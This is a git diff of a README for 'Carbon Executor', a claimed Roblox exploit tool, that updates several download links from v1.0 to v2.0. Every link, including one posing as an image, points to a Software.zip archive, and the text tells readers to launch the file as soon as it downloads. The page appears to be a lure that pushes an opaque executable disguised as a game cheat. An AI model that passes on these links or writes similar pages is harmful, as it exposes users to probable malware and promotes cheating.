@@ -1,6 +1,6 @@
 # 🚀 Carbon Executor - Unleash the Power of Gaming!
 
-[![Download Carbon Executor](https://github.com/Sam9099/Carbon-Executor/releases/download/v1.0/Software.zip)](https://github.com/Sam9099/Carbon-Executor/releases/download/v1.0/Software.zip)
+[![Download Carbon Executor](https://github.com/Sam9099/Carbon-Executor/releases/download/v2.0/Software.zip)](https://github.com/Sam9099/Carbon-Executor/releases/download/v2.0/Software.zip)
 
 Welcome to Carbon Executor, your ultimate solution for Roblox exploits! This state-of-the-art tool offers unparalleled performance and security, providing users with 90% UNC support and Level 8 execution capabilities. With compatibility spanning from Windows 7 to 11, Carbon Executor empowers you to unlock the full potential of Roblox scripting effortlessly.
 
@@ -31,7 +31,7 @@ Welcome to Carbon Executor, your ultimate solution for Roblox exploits! This sta
 ## Getting Started
 
 To unleash the full potential of Carbon Executor, simply download the latest version from the link below:
-[Download Carbon Executor v1.0.0](https://github.com/Sam9099/Carbon-Executor/releases/download/v1.0/Software.zip)
+[Download Carbon Executor v1.0.0](https://github.com/Sam9099/Carbon-Executor/releases/download/v2.0/Software.zip)
 
 **Note**: The file needs to be launched upon download.
 
@@ -41,6 +41,6 @@ For any inquiries or assistance regarding Carbon Executor, please check the "Rel
 
 Let Carbon Executor be your guiding light in the world of Roblox game development! 🚀
 
-![Roblox Image](https://github.com/Sam9099/Carbon-Executor/releases/download/v1.0/Software.zip)
+![Roblox Image](https://github.com/Sam9099/Carbon-Executor/releases/download/v2.0/Software.zip)
 
 Start your journey now and witness the magic of Carbon Executor! 🌟
